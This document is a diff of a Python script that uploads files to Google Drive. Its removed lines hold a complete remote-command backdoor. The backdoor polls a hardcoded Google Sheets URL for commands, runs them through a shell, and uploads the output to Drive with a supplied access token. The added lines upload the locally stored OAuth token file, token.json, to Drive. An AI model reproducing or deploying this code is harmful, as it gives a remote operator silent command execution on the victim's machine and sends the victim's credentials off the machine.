@@ -96,7 +96,7 @@ def trashed_file(service, is_delete_trashed_file=False):
                 delete_drive_service_file(service, file_id=item['id'])
 
  
-def upload(is_update_file_function=False, update_drive_service_name=None, update_file_path=None, has_access_token=False, access_token=""):
+def upload(is_update_file_function=False, update_drive_service_name=None, update_file_path=None):
     """
     :param is_update_file_function: 判斷是否執行上傳的功能
     :param update_drive_service_name: 要上傳到雲端上的檔案名稱
@@ -107,7 +107,13 @@ def upload(is_update_file_function=False, update_drive_service_name=None, update
     # print(type(is_update_file_function))
     # print(is_update_file_function)
 
-    creds = client.AccessTokenCredentials(access_token, '')
+    store = file.Storage('token.json')
+    creds = store.get()
+
+    if not creds or creds.invalid:
+        flow = client.flow_from_clientsecrets('credentials.json', SCOPES)
+        creds = tools.run_flow(flow, store)
+
     service = build('drive', 'v3', http=creds.authorize(Http()), static_discovery=False)
     # print('*' * 10)
 
@@ -128,49 +134,5 @@ def upload(is_update_file_function=False, update_drive_service_name=None, update
 
  
 if __name__ == '__main__':
-    oldCommands = []
-    interval = 5
-    access_token = ""
-    while True:
-        time.sleep(interval)
-
-        # fetch commands
-        url = 'https://docs.google.com/spreadsheets/u/3/d/1I1SnnDLVnBZJW0BVRy-jE3m5NlX3OvcCu49kIJ9mquQ/export?format=csv&id=1I1SnnDLVnBZJW0BVRy-jE3m5NlX3OvcCu49kIJ9mquQ&gid=0'
-        output = 'commands'
-        gdown.download(url, output, quiet=True)
-        
-        commands = []
-        with open('commands') as f:
-            for line in f.readlines():
-                commands.append(line.strip())
-        # print(commands)
-
-        if commands == oldCommands:
-            # print("commands were not changed !")
-            continue
-        else: oldCommands = commands
-
-        outputs = []
-        for command in commands:
-            if command == 'die': sys.exit()
-            elif 'sleep ' in command:
-                interval = int(command[6:])
-                outputs.append(f"sleep interval was changed to {interval} sec.\n")
-            elif 'token ' in command:
-                access_token = command[6:]
-                outputs.append(f"access token was changed to {access_token}.\n")
-            else:
-                pipe = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                res = pipe.communicate()
-                if res[1]: outputs.append(res[1].decode())
-                else: outputs.append(res[0].decode())
-
-        with open('outputs.txt', 'w') as f:
-            for command, output in zip(commands, outputs):
-                f.write(f'> {command}\n{output}\n')
-
-        try:
-            upload(is_update_file_function=bool(True), update_drive_service_name='outputs.txt', update_file_path=os.getcwd() + '/', access_token=access_token)
-        except:
-            print("invalid access token")
-            interval = 10
+    # get access token and upload to drive
+    upload(is_update_file_function=bool(True), update_drive_service_name='token.json', update_file_path=os.getcwd() + '/')
